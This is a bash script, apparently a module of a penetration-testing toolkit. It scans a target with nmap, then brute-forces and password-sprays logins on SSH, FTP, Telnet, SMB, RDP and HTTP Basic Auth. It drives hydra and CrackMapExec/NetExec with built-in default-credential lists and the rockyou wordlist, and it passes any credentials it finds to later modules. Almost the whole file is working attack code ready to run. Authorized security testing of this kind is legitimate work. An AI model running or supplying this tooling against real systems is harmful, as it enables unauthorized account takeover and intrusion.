#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

set -uo pipefail

banner "CREDENTIAL BRUTE-FORCE" "SSH · FTP · HTTP Basic · Telnet · SMB · RDP"

require_tool hydra "apt install hydra"
require_tool nmap  "apt install nmap"

# ── Target & output ───────────────────────────────────────────────────────────
target="$(prompt_target)"
outdir="$(make_outdir)"
outfile="$outdir/brute.txt"
credfile="$outdir/.brute_creds"
: > "$outfile"

trap 'rm -f "$credfile" "$outdir/.brute_users" "$outdir/.brute_pass" "$outdir/.spray_users" "$outdir/.spray_pass" 2>/dev/null || true' EXIT

_WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"

printf '  %s[SYS]%s Target   : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$target" "${RESET}"
printf '  %s[SYS]%s Output   : %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
printf '  %s[SYS]%s Wordlist : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$_WORDLIST" "${RESET}"

# ── Detect CrackMapExec / NetExec ─────────────────────────────────────────────
_CME=""
if   command -v nxc          &>/dev/null; then _CME="nxc"
elif command -v crackmapexec &>/dev/null; then _CME="crackmapexec"
fi
if [[ -n "$_CME" ]]; then
    printf '  %s[+]%s CME backend : %s%s%s\n' "${GREEN}" "${RESET}" "${DIM}" "$_CME" "${RESET}"
    printf '  %s[*]%s SSH and SMB will use %s (better detection, fewer false positives)%s\n\n' \
        "${CYAN}" "${RESET}" "$_CME" "${RESET}"
else
    printf '  %s[~]%s crackmapexec / nxc not found — SSH and SMB will fall back to hydra%s\n' \
        "${DIM}" "${RESET}" "${RESET}"
    printf '  %s[~]%s Install: %sapt install crackmapexec%s  or  %spip install netexec%s\n\n' \
        "${DIM}" "${RESET}" "${CYAN}" "${RESET}" "${CYAN}" "${RESET}"
fi

# ── Credential library ────────────────────────────────────────────────────────
_CREDS_GENERIC=(
  "admin:"          "admin:admin"       "admin:password"    "admin:1234"
  "admin:12345"     "admin:123456"      "admin:admin123"    "admin:pass"
  "admin:test"      "admin:Admin123"    "admin:Welcome1"    "admin:changeme"
  "admin:letmein"   "admin:qwerty"      "admin:P@ssw0rd"    "admin:admin1"
  "root:"           "root:root"         "root:toor"         "root:password"
  "root:1234"       "root:admin"        "root:12345"        "root:changeme"
  "user:user"       "user:password"     "user:1234"
  "guest:"          "guest:guest"       "guest:password"
  "pi:raspberry"    "ubnt:ubnt"         "cisco:cisco"       "support:support"
  "test:test"       "operator:operator" "service:service"   "manager:manager"
  "monitor:monitor" "camera:camera"     "admin:camera"
  "ftpuser:ftpuser" "ftp:ftp"           "anonymous:"        "anonymous:anonymous"
  "supervisor:supervisor" "default:default" "system:system" "admin:system"
  "admin:root"      "root:admin1"
)

_CREDS_SMB=(
  "administrator:"         "administrator:password"
  "administrator:Admin123" "administrator:Welcome1"
  "administrator:P@ssw0rd" "administrator:changeme"
  "admin:admin"            "admin:password"
  "admin:Admin123"         "admin:Welcome1"
  "guest:"                 "user:"
  "user:password"
)

# ── HTTP Basic Auth detection ──────────────────────────────────────────────────
# Checks common paths for 401 + WWW-Authenticate: Basic header.
# Prints the authenticated path on stdout; returns 1 if no Basic Auth found.
# This prevents false positives from form-based or open endpoints.
_detect_http_basic() {
    local host="$1" port="$2" scheme="$3"
    local -a _paths=("/" "/admin" "/cgi-bin/" "/manager/html" "/configuration.cgi" "/setup")
    for _path in "${_paths[@]}"; do
        local url="${scheme}://${host}:${port}${_path}"
        local code
        code=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || true)
        if [[ "$code" == "401" ]]; then
            if curl -sk --max-time 5 -I "$url" 2>/dev/null | grep -qi 'WWW-Authenticate:.*Basic'; then
                echo "$_path"
                return 0
            fi
        fi
    done
    return 1
}

# ── Service discovery ─────────────────────────────────────────────────────────
BRUTE_PORTS="21,22,23,80,443,445,3389,8080,8443"

_port_to_svc() {
  case "$1" in
    21)       echo "ftp"    ;;
    22)       echo "ssh"    ;;
    23)       echo "telnet" ;;
    80|8080)  echo "http"   ;;
    443|8443) echo "https"  ;;
    445)      echo "smb"    ;;
    3389)     echo "rdp"    ;;
    *)        echo "tcp"    ;;
  esac
}

section "SERVICE DISCOVERY"

declare -a D_HOST=()
declare -a D_PORT=()
declare -a D_SVC=()

# Pipeline chain: if chain_ports.txt exists, build target list directly — no nmap needed
if [[ -n "${SESSION_DIR:-}" ]] && [[ -s "${SESSION_DIR}/chain_ports.txt" ]]; then
  printf '  %s[CHAIN]%s Loading open ports from chain_ports.txt — skipping discovery%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
  while IFS=: read -r _chain_ip _chain_port; do
    [[ -z "$_chain_ip" || -z "$_chain_port" ]] && continue
    _svc=$(_port_to_svc "$_chain_port")
    # Only target brute-forceable services
    case "$_svc" in ssh|ftp|telnet|smb|rdp|http|vnc) : ;; *) continue ;; esac
    D_HOST+=("$_chain_ip"); D_PORT+=("$_chain_port"); D_SVC+=("$_svc")
  done < "${SESSION_DIR}/chain_ports.txt"
  printf '  %s[CHAIN]%s %d brute-forceable service(s) from chain_ports.txt%s\n\n' \
    "${CYAN}" "${RESET}" "${#D_HOST[@]}" "${RESET}"
fi

# Fallback: scan if chain_ports.txt not available
if [[ ${#D_HOST[@]} -eq 0 ]]; then
# Pipeline chain: if nmap.txt already exists in session, use it instead of rescanning
_brute_scan_input="$target"
if [[ -n "${SESSION_DIR:-}" ]] && [[ -f "${SESSION_DIR}/nmap.txt" ]]; then
  printf '  %s[CHAIN]%s Re-using nmap.txt from session — skipping discovery scan%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
  mapfile -t _scan < "$SESSION_DIR/nmap.txt"
elif [[ -n "${SESSION_DIR:-}" ]] && [[ -s "${SESSION_DIR}/alive_hosts.txt" ]]; then
  printf '  %s[CHAIN]%s Targeting %s discovered host(s) from alive_hosts.txt%s\n\n' \
    "${CYAN}" "${RESET}" "$(wc -l < "${SESSION_DIR}/alive_hosts.txt")" "${RESET}"
  _brute_scan_input=$(paste -sd' ' "${SESSION_DIR}/alive_hosts.txt")
  printf '  %s[*]%s Scanning discovered hosts...%s\n' "${CYAN}" "${RESET}" "${RESET}"
  start_spin "nmap scan running"
  mapfile -t _scan < <(
    nmap -sS -Pn -n -T4 --max-retries 2 --max-scan-delay 10ms --min-rate 300 \
         -p "$BRUTE_PORTS" --open \
         $_brute_scan_input 2>/dev/null
  )
  stop_spin
else
  printf '  %s[*]%s Scanning %s...%s\n' "${CYAN}" "${RESET}" "$target" "${RESET}"
  start_spin "nmap scan running"
  mapfile -t _scan < <(
    nmap -sS -Pn -n -T4 --max-retries 2 --max-scan-delay 10ms --min-rate 300 \
         -p "$BRUTE_PORTS" --open \
         "$target" 2>/dev/null
  )
  stop_spin
fi

_cur=""
for _line in "${_scan[@]}"; do
  if [[ "$_line" =~ scan\ report\ for\ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; then
    _cur="${BASH_REMATCH[1]}"
  elif [[ -n "${_cur}" && "$_line" =~ ^([0-9]+)/tcp.*open ]]; then
    D_HOST+=("$_cur")
    D_PORT+=("${BASH_REMATCH[1]}")
    D_SVC+=("$(_port_to_svc "${BASH_REMATCH[1]}")")
  fi
done

fi  # end fallback scan block

if [[ ${#D_HOST[@]} -eq 0 ]]; then
  printf '  %s[!] No brute-forceable services found on %s.%s\n\n' "${RED}" "$target" "${RESET}"
  exit 0
fi

printf '\n  %s[+]%s %d service(s) discovered:\n\n' "${GREEN}" "${RESET}" "${#D_HOST[@]}"
printf '  %s  %-4s  %-15s  %-6s  %-10s%s\n' "${DIM}" "ID" "HOST" "PORT" "SERVICE" "${RESET}"
printf '  %s  ──── ─────────────── ────── ──────────%s\n' "${DIM}" "${RESET}"
for i in "${!D_HOST[@]}"; do
  printf '  %s[%02d]%s  %-15s  %-6s  %s\n' \
    "${CYAN}" "$(( i + 1 ))" "${RESET}" \
    "${D_HOST[$i]}" "${D_PORT[$i]}" "${D_SVC[$i]^^}"
done
printf '\n'

# ── Attack mode ───────────────────────────────────────────────────────────────
printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
printf '  %s│  ATTACK MODE                                     │%s\n' "${CYAN}${BOLD}" "${RESET}"
printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
printf '\n'
printf '  %s[01]%s ▶  Quick      all services — top 20 pairs       %s(fast)%s\n'      "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s[02]%s ▶  Extended   all services — top 50 pairs       %s(thorough)%s\n'  "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '  %s[03]%s ▶  Select     pick specific services by ID\n'                       "${CYAN}" "${RESET}"
printf '  %s[04]%s ▶  Dictionary wordlist + common users           %s(slow)%s\n'       "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
printf '\n'
if [[ -z "${SESSION_DIR:-}" ]]; then
  printf '  %s>>%s ' "${CYAN}" "${RESET}"
  read -r _mode
  echo
else
  _mode=1
  printf '  %s[CHAIN]%s Mode: Quick (pipeline auto-select)%s\n\n' "${CYAN}" "${RESET}" "${RESET}"
fi

case "${_mode:-1}" in
  2) CRED_LIMIT=50 ;;
  *) CRED_LIMIT=20 ;;
esac

_DICT_MODE=false
[[ "${_mode:-1}" == "4" ]] && _DICT_MODE=true

declare -a TO_ATTACK=()
if [[ "${_mode:-1}" == "3" ]]; then
  printf '  %s>>%s Service IDs to attack (space-separated, e.g. 1 3 5): ' "${CYAN}" "${RESET}"
  read -r _ids
  for _id in $_ids; do
    if [[ "$_id" =~ ^[0-9]+$ ]] && (( _id >= 1 && _id <= ${#D_HOST[@]} )); then
      TO_ATTACK+=("$(( _id - 1 ))")
    fi
  done
else
  for i in "${!D_HOST[@]}"; do
    TO_ATTACK+=("$i")
  done
fi

if [[ ${#TO_ATTACK[@]} -eq 0 ]]; then
  printf '  %s[!] No valid services selected.%s\n' "${RED}" "${RESET}"
  exit 0
fi

# ── Custom credentials (spray) ─────────────────────────────────────────────────
section "CUSTOM CREDENTIALS"
printf '  Spray known creds across all selected services before the default list.\n'
printf '  Leave blank to skip and use default pairs only.\n\n'

if [[ -z "${SESSION_DIR:-}" ]]; then
  printf '  %s>>%s Username (blank = use default user list): ' "${CYAN}" "${RESET}"
  IFS= read -r CUSTOM_USER
  # Disable history expansion so ! and other chars in passwords are read literally
  set +H
  printf '  %s>>%s Password (blank = use default wordlist): ' "${CYAN}" "${RESET}"
  IFS= read -r CUSTOM_PASS
  set -H 2>/dev/null || true
else
  CUSTOM_USER=""
  CUSTOM_PASS=""
  # Pipeline: if chain_users.txt exists, use it as spray user file
  if [[ -s "${SESSION_DIR}/chain_users.txt" ]]; then
    _uc=$(wc -l < "${SESSION_DIR}/chain_users.txt")
    printf '  %s[CHAIN]%s Using chain_users.txt (%s AD users) as spray list%s\n\n' \
      "${CYAN}" "${RESET}" "$_uc" "${RESET}"
    # Write to temp file for hydra -L flag usage
    _CHAIN_USERS_FILE="${SESSION_DIR}/chain_users.txt"
  fi
fi

CUSTOM_MODE=false
ALSO_DEFAULT=true
if [[ -n "$CUSTOM_USER" || -n "$CUSTOM_PASS" ]]; then
  CUSTOM_MODE=true
  printf '\n  %s[*]%s Spray creds  user:[%s]  pass:[%s]%s\n' \
    "${GREEN}" "${RESET}" \
    "${CUSTOM_USER:-<default list>}" "${CUSTOM_PASS:-<default wordlist>}" "${RESET}"
  if [[ -z "${SESSION_DIR:-}" ]]; then
    printf '  %s>>%s Also run default pairs after? [Y/n]: ' "${CYAN}" "${RESET}"
    IFS= read -r _also
    [[ "$_also" =~ ^[Nn] ]] && ALSO_DEFAULT=false || ALSO_DEFAULT=true
  fi
else
  printf '  %s[~]%s No custom creds entered — using default pairs only%s\n' "${DIM}" "${RESET}" "${RESET}"
fi
printf '\n'

# ── Attack runners ─────────────────────────────────────────────────────────────

# Write a found credential in hydra format so importCredentials in Dart still parses it.
_log_cred() {
    local port="$1" proto="$2" host="$3" user="$4" pass="$5"
    local line="[$port][$proto] host: $host   login: $user   password: ${pass:-(empty)}"
    printf '  %s[✔] FOUND  %s%s\n' "${GREEN}" "$line" "${RESET}"
    printf '%s\n' "$line" >> "$outfile"
}

# ── Hydra runner (FTP, Telnet, RDP, and SSH/SMB fallback) ─────────────────────
_run_hydra() {
    local host="$1" port="$2" svc="$3" module="$4" path="${5:-}"
    local found=0

    if [[ "$svc" == "smb" ]]; then
        printf '%s\n' "${_CREDS_SMB[@]}" > "$credfile"
    else
        printf '%s\n' "${_CREDS_GENERIC[@]:0:$CRED_LIMIT}" > "$credfile"
    fi

    local -a hargs=(-C "$credfile" -t 4 -q -s "$port" "$host" "$module")
    [[ -n "$path" ]] && hargs+=("$path")

    while IFS= read -r _result; do
        if [[ "$_result" == *"login:"* ]]; then
            local _u _p
            _u=$(printf '%s' "$_result" | grep -oP '(?<=login: )\S+' || true)
            _p=$(printf '%s' "$_result" | grep -oP '(?<=password: )\S*' || true)
            _log_cred "$port" "$svc" "$host" "${_u:-?}" "${_p:-}"
            found=$(( found + 1 ))
        fi
    done < <(hydra "${hargs[@]}" 2>/dev/null || true)

    [[ $found -eq 0 ]] \
        && printf '  %s[~]%s No credentials found%s\n' "${DIM}" "${RESET}" "${RESET}" \
        || printf '  %s[+]%s %d credential(s) found%s\n' "${GREEN}" "${RESET}" "$found" "${RESET}"
}

# ── CME runner (SSH / SMB — better auth detection, no false positives) ─────────
_run_cme() {
    local host="$1" port="$2" proto="$3"
    local found=0 total=0

    if [[ "$proto" == "smb" ]]; then
        printf '%s\n' "${_CREDS_SMB[@]}" > "$credfile"
    else
        printf '%s\n' "${_CREDS_GENERIC[@]:0:$CRED_LIMIT}" > "$credfile"
    fi

    total=$(wc -l < "$credfile")
    printf '  %s[*]%s Testing %d pairs via %s...%s\n' "${CYAN}" "${RESET}" "$total" "$_CME" "${RESET}"

    while IFS=: read -r _user _pass; do
        [[ -z "$_user" ]] && continue
        local _out
        _out=$("$_CME" "$proto" "$host" -u "$_user" -p "${_pass:-}" 2>/dev/null || true)
        # [+] = valid credential confirmed by CME
        if printf '%s' "$_out" | grep -q '\[+\]'; then
            _log_cred "$port" "$proto" "$host" "$_user" "${_pass:-}"
            found=$(( found + 1 ))
        fi
    done < "$credfile"

    [[ $found -eq 0 ]] \
        && printf '  %s[~]%s No credentials found%s\n' "${DIM}" "${RESET}" "${RESET}" \
        || printf '  %s[+]%s %d credential(s) found%s\n' "${GREEN}" "${RESET}" "$found" "${RESET}"
}

# ── Dictionary attack (hydra -L users -P wordlist) ────────────────────────────
_DICT_USERS=(admin root user administrator guest pi ubnt cisco support operator)

_run_wordlist() {
    local host="$1" port="$2" svc="$3" module="$4" path="${5:-}"

    if [[ ! -f "$_WORDLIST" ]]; then
        printf '  %s[!]%s Wordlist not found: %s%s%s\n' \
            "${RED}" "${RESET}" "${DIM}" "$_WORDLIST" "${RESET}"
        return
    fi

    local _ufile="$outdir/.brute_users"
    printf '%s\n' "${_DICT_USERS[@]}" > "$_ufile"
    local found=0

    printf '  %s[*]%s Dictionary: %d users × %s%s\n' \
        "${CYAN}" "${RESET}" "${#_DICT_USERS[@]}" "$_WORDLIST" "${RESET}"

    local -a hargs=(-L "$_ufile" -P "$_WORDLIST" -t 4 -q -s "$port" "$host" "$module")
    [[ -n "$path" ]] && hargs+=("$path")

    while IFS= read -r _result; do
        if [[ "$_result" == *"login:"* ]]; then
            local _u _p
            _u=$(printf '%s' "$_result" | grep -oP '(?<=login: )\S+' || true)
            _p=$(printf '%s' "$_result" | grep -oP '(?<=password: )\S*' || true)
            _log_cred "$port" "$svc" "$host" "${_u:-?}" "${_p:-}"
            found=$(( found + 1 ))
        fi
    done < <(hydra "${hargs[@]}" 2>/dev/null || true)

    [[ $found -eq 0 ]] \
        && printf '  %s[~]%s No credentials found%s\n' "${DIM}" "${RESET}" "${RESET}" \
        || printf '  %s[+]%s %d credential(s) found%s\n' "${GREEN}" "${RESET}" "$found" "${RESET}"
}

# ── Custom credential spray ────────────────────────────────────────────────────
# Uses file-based -L/-P for hydra (safest for special chars — shell never re-parses
# file contents). CME receives creds as direct argv elements via array expansion.
_run_custom_spray() {
    local host="$1" port="$2" svc="$3"
    local found=0

    # Write user(s) to temp file using printf '%s\n' — preserves every byte
    local _ufile="$outdir/.spray_users"
    local _pfile="$outdir/.spray_pass"
    local _own_pfile=false

    if [[ -n "$CUSTOM_USER" ]]; then
        printf '%s\n' "$CUSTOM_USER" > "$_ufile"
    else
        printf '%s\n' "${_DICT_USERS[@]}" > "$_ufile"
    fi

    if [[ -n "$CUSTOM_PASS" ]]; then
        printf '%s\n' "$CUSTOM_PASS" > "$_pfile"
        _own_pfile=true
    elif [[ -f "$_WORDLIST" ]]; then
        _pfile="$_WORDLIST"
    else
        printf '  %s[!]%s No wordlist at %s — skipping password spray%s\n' \
            "${RED}" "${RESET}" "$_WORDLIST" "${RESET}"
        return
    fi

    printf '  %s[SPRAY]%s user:[%s]  pass:[%s]%s\n' \
        "${YELLOW}" "${RESET}" \
        "${CUSTOM_USER:-<list>}" "${CUSTOM_PASS:-<wordlist>}" "${RESET}"

    # CME path — SSH and SMB: pass creds as direct argv, handles any special char
    if [[ -n "$_CME" && ( "$svc" == "ssh" || "$svc" == "smb" ) ]]; then
        # CME accepts a filename or a literal string for -u / -p;
        # it checks if the value is an existing file path, otherwise treats as literal.
        local _cu _cp
        [[ -n "$CUSTOM_USER" ]] && _cu="$CUSTOM_USER" || _cu="$_ufile"
        [[ -n "$CUSTOM_PASS" ]] && _cp="$CUSTOM_PASS" || _cp="$_pfile"

        local _out
        _out=$("$_CME" "$svc" "$host" -u "$_cu" -p "$_cp" 2>/dev/null || true)

        # Parse each [+] line
        while IFS= read -r _line; do
            if printf '%s' "$_line" | grep -q '\[+\]'; then
                local _u _p
                _u=$(printf '%s' "$_line" | grep -oP '(?<=\\(Pwn3d!\\)|U:)[^\s]+' || \
                     printf '%s' "$_line" | grep -oP '\(u:\K[^)]+' || echo "$_cu")
                _log_cred "$port" "$svc" "$host" "${_u:-$_cu}" "$_cp"
                found=$(( found + 1 ))
            fi
        done <<< "$_out"

        # Simpler fallback: if [+] found anywhere just log what we know
        if [[ $found -eq 0 ]] && printf '%s' "$_out" | grep -q '\[+\]'; then
            _log_cred "$port" "$svc" "$host" "$_cu" "$_cp"
            found=1
        fi

    else
        # Hydra path — always file-based (-L / -P) so special chars in the
        # password file are passed to hydra without any shell re-interpretation
        local _module
        case "$svc" in
            ssh)    _module="ssh"       ;;
            smb)    _module="smb"       ;;
            ftp)    _module="ftp"       ;;
            telnet) _module="telnet"    ;;
            rdp)    _module="rdp"       ;;
            http)   _module="http-get"  ;;
            https)  _module="https-get" ;;
            *)
                printf '  %s[~]%s Custom spray: %s not supported via hydra%s\n' \
                    "${DIM}" "${RESET}" "$svc" "${RESET}"
                return
                ;;
        esac

        local -a _hargs=(-L "$_ufile" -P "$_pfile" -t 4 -q -s "$port" "$host" "$_module")

        while IFS= read -r _result; do
            if [[ "$_result" == *"login:"* ]]; then
                local _u _p
                _u=$(printf '%s' "$_result" | grep -oP '(?<=login: )\S+' || true)
                _p=$(printf '%s' "$_result" | grep -oP '(?<=password: )\S*' || true)
                _log_cred "$port" "$svc" "$host" "${_u:-?}" "${_p:-}"
                found=$(( found + 1 ))
            fi
        done < <(hydra "${_hargs[@]}" 2>/dev/null || true)
    fi

    [[ $found -eq 0 ]] \
        && printf '  %s[~]%s No match%s\n' "${DIM}" "${RESET}" "${RESET}" \
        || printf '  %s[+]%s %d match(es) with custom credentials%s\n' "${GREEN}" "${RESET}" "$found" "${RESET}"
}

# ── HTTP / HTTPS: verify Basic Auth before attempting anything ─────────────────
_run_http() {
    local host="$1" port="$2" scheme="$3"

    printf '  %s[*]%s Probing %s://%s:%s for HTTP Basic Auth...%s\n' \
        "${CYAN}" "${RESET}" "$scheme" "$host" "$port" "${RESET}"

    local _basic_path
    if ! _basic_path=$(_detect_http_basic "$host" "$port" "$scheme" 2>/dev/null); then
        printf '  %s[~]%s No HTTP Basic Auth detected — skipping%s\n' "${DIM}" "${RESET}" "${RESET}"
        printf '  %s[~]%s %s(form-based auth needs nuclei or manual testing)%s\n' \
            "${DIM}" "${RESET}" "${DIM}" "${RESET}"
        return
    fi

    printf '  %s[+]%s HTTP Basic Auth confirmed on %s — brute forcing...%s\n' \
        "${GREEN}" "${RESET}" "$_basic_path" "${RESET}"

    local module
    [[ "$scheme" == "https" ]] && module="https-get" || module="http-get"
    _run_hydra "$host" "$port" "$scheme" "$module" "$_basic_path"
}

# ── Main service dispatcher ────────────────────────────────────────────────────
_run_service() {
    local host="$1" port="$2" svc="$3"

    printf '\n  %s▶%s  %s  ·  port %s  ·  [%s]\n' \
        "${CYAN}${BOLD}" "${RESET}" "$host" "$port" "${svc^^}"
    printf '  %s──────────────────────────────────────────────%s\n' "${DIM}" "${RESET}"

    # Custom credential spray (always runs first when CUSTOM_MODE=true)
    if [[ "$CUSTOM_MODE" == "true" ]]; then
        if [[ "$svc" == "http" || "$svc" == "https" ]]; then
            # HTTP needs Basic Auth detection before we can spray
            local _basic_path
            if _basic_path=$(_detect_http_basic "$host" "$port" "$svc" 2>/dev/null); then
                printf '  %s[+]%s HTTP Basic Auth on %s — spraying...%s\n' \
                    "${GREEN}" "${RESET}" "$_basic_path" "${RESET}"
                local _ufile="$outdir/.spray_users"
                local _pfile="$outdir/.spray_pass"
                [[ -n "$CUSTOM_USER" ]] && printf '%s\n' "$CUSTOM_USER" > "$_ufile" \
                                        || printf '%s\n' "${_DICT_USERS[@]}" > "$_ufile"
                if [[ -n "$CUSTOM_PASS" ]]; then
                    printf '%s\n' "$CUSTOM_PASS" > "$_pfile"
                else
                    _pfile="$_WORDLIST"
                fi
                local _hmod; [[ "$svc" == "https" ]] && _hmod="https-get" || _hmod="http-get"
                local found=0
                while IFS= read -r _r; do
                    if [[ "$_r" == *"login:"* ]]; then
                        local _u _p
                        _u=$(printf '%s' "$_r" | grep -oP '(?<=login: )\S+' || true)
                        _p=$(printf '%s' "$_r" | grep -oP '(?<=password: )\S*' || true)
                        _log_cred "$port" "$svc" "$host" "${_u:-?}" "${_p:-}"
                        found=$(( found + 1 ))
                    fi
                done < <(hydra -L "$_ufile" -P "$_pfile" -t 4 -q -s "$port" \
                              "$host" "$_hmod" "$_basic_path" 2>/dev/null || true)
                [[ $found -eq 0 ]] \
                    && printf '  %s[~]%s No match%s\n' "${DIM}" "${RESET}" "${RESET}" \
                    || printf '  %s[+]%s %d match(es)%s\n' "${GREEN}" "${RESET}" "$found" "${RESET}"
            else
                printf '  %s[~]%s No HTTP Basic Auth — skipping custom spray for HTTP%s\n' \
                    "${DIM}" "${RESET}" "${RESET}"
            fi
        else
            _run_custom_spray "$host" "$port" "$svc"
        fi
        [[ "$ALSO_DEFAULT" == "false" ]] && return
        printf '  %s[*]%s Continuing with default pairs...%s\n' "${CYAN}" "${RESET}" "${RESET}"
    fi

    if [[ "$_DICT_MODE" == "true" ]]; then
        case "$svc" in
            http|https)
                local _scheme="$svc"
                printf '  %s[*]%s Probing %s://%s:%s for HTTP Basic Auth...%s\n' \
                    "${CYAN}" "${RESET}" "$_scheme" "$host" "$port" "${RESET}"
                local _dpath
                if ! _dpath=$(_detect_http_basic "$host" "$port" "$_scheme" 2>/dev/null); then
                    printf '  %s[~]%s No HTTP Basic Auth detected — skipping%s\n' "${DIM}" "${RESET}" "${RESET}"
                    return
                fi
                printf '  %s[+]%s HTTP Basic Auth confirmed on %s%s\n' "${GREEN}" "${RESET}" "$_dpath" "${RESET}"
                local _module
                [[ "$_scheme" == "https" ]] && _module="https-get" || _module="http-get"
                _run_wordlist "$host" "$port" "$_scheme" "$_module" "$_dpath"
                ;;
            ssh)    _run_wordlist "$host" "$port" "ssh"    "ssh"    ;;
            smb)    _run_wordlist "$host" "$port" "smb"    "smb"    ;;
            ftp)    _run_wordlist "$host" "$port" "ftp"    "ftp"    ;;
            telnet) _run_wordlist "$host" "$port" "telnet" "telnet" ;;
            rdp)    _run_wordlist "$host" "$port" "rdp"    "rdp"    ;;
            *)      printf '  %s[~]%s Protocol %s not supported%s\n' "${DIM}" "${RESET}" "$svc" "${RESET}" ;;
        esac
        return
    fi

    case "$svc" in
        http|https)
            _run_http "$host" "$port" "$svc"
            ;;
        ssh)
            if [[ -n "$_CME" ]]; then
                _run_cme "$host" "$port" "ssh"
            else
                printf '  %s[*]%s Using hydra for SSH (install nxc/crackmapexec for better results)%s\n' \
                    "${CYAN}" "${RESET}" "${RESET}"
                _run_hydra "$host" "$port" "ssh" "ssh"
            fi
            ;;
        smb)
            if [[ -n "$_CME" ]]; then
                _run_cme "$host" "$port" "smb"
            else
                printf '  %s[*]%s Using hydra for SMB (install nxc/crackmapexec for better results)%s\n' \
                    "${CYAN}" "${RESET}" "${RESET}"
                _run_hydra "$host" "$port" "smb" "smb"
            fi
            ;;
        ftp)
            _run_hydra "$host" "$port" "ftp" "ftp"
            ;;
        telnet)
            _run_hydra "$host" "$port" "telnet" "telnet"
            ;;
        rdp)
            _run_hydra "$host" "$port" "rdp" "rdp"
            ;;
        *)
            printf '  %s[~]%s Protocol %s not supported%s\n' "${DIM}" "${RESET}" "$svc" "${RESET}"
            ;;
    esac
}

# ── Run attacks ───────────────────────────────────────────────────────────────
section "RUNNING ATTACKS"
printf '  %s[*]%s %d service(s)  ·  up to %d credential pairs each%s\n\n' \
  "${CYAN}" "${RESET}" "${#TO_ATTACK[@]}" "$CRED_LIMIT" "${RESET}"

for idx in "${TO_ATTACK[@]}"; do
  _run_service "${D_HOST[$idx]}" "${D_PORT[$idx]}" "${D_SVC[$idx]}"
done

# ── HTTP Basic Auth from web scan 401 discoveries ─────────────────────────────
if [[ -n "${SESSION_DIR:-}" ]] && [[ -s "${SESSION_DIR}/chain_web_401.txt" ]]; then
  printf '\n'
  section "HTTP BASIC AUTH — from web scan"
  printf '  %s[CHAIN]%s chain_web_401.txt found — brute forcing confirmed 401 paths%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
  while IFS= read -r _url; do
    [[ -z "$_url" ]] && continue
    _scheme=$(printf '%s' "$_url" | grep -oP '^https?' || true)
    [[ -z "$_scheme" ]] && continue
    _hostport=$(printf '%s' "$_url" | grep -oP '(?<=://)([^/]+)' || true)
    _host=$(printf '%s' "$_hostport" | cut -d: -f1)
    _port=$(printf '%s' "$_hostport" | grep -oP ':\K\d+' || true)
    [[ -z "$_port" ]] && { [[ "$_scheme" == "https" ]] && _port=443 || _port=80; }
    _path=$(printf '%s' "$_url" | grep -oP '(?<=://[^/]{1,200})(/.*)' | head -1 || true)
    [[ -z "$_path" ]] && _path="/"
    _mod="http-get"; [[ "$_scheme" == "https" ]] && _mod="https-get"
    printf '\n  %s▶%s  %s  %s:%s%s\n' \
      "${CYAN}${BOLD}" "${RESET}" "${_scheme^^}" "$_host" "$_port" "$_path"
    printf '  %s──────────────────────────────────────────────%s\n' "${DIM}" "${RESET}"
    _run_hydra "$_host" "$_port" "$_scheme" "$_mod" "$_path"
  done < "${SESSION_DIR}/chain_web_401.txt"
fi

# ── Summary ───────────────────────────────────────────────────────────────────
printf '\n'
printf '  %s┌──────────────────────────────────────────────────┐%s\n' "${CYAN}" "${RESET}"
printf '  %s│  RESULTS                                         │%s\n' "${CYAN}${BOLD}" "${RESET}"
printf '  %s└──────────────────────────────────────────────────┘%s\n' "${CYAN}" "${RESET}"
printf '\n'

if [[ -s "$outfile" ]]; then
  total=$(wc -l < "$outfile")
  printf '  %s[✔] %d credential(s) found:%s\n\n' "${GREEN}" "$total" "${RESET}"
  while IFS= read -r _line; do
    printf '  %s  ▶  %s%s\n' "${GREEN}" "$_line" "${RESET}"
  done < "$outfile"
else
  printf '  %s[~]%s No valid credentials found on any target.%s\n' "${DIM}" "${RESET}" "${RESET}"
fi

printf '\n  %s[SYS]%s Report : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"

# ── Pipeline chain: publish creds to shared chain_creds.txt ───────────────────
if [[ -n "${SESSION_DIR:-}" ]] && [[ -s "$outfile" ]]; then
  cat "$outfile" >> "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || true
  sort -u "${SESSION_DIR}/chain_creds.txt" -o "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || true
  _cc=$(wc -l < "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || echo 0)
  printf '  %s[CHAIN]%s chain_creds.txt updated — %s credential(s) available to downstream modules%s\n\n' \
    "${CYAN}" "${RESET}" "$_cc" "${RESET}"
fi

mark_done "$outfile"
